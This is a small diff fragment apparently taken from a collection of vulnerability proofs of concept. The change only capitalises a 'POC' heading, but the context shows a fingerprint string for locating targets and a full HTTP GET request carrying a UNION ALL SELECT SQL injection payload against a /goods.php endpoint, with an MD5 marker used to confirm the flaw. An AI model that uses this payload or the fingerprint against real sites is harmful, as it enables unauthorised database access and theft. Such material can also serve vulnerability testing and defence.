@@ -8,7 +8,7 @@
 body="/Mao_Public/js/jquery-2.1.1.min.js"
 ```
 
-## poc
+## POC
 
 ```java
 GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
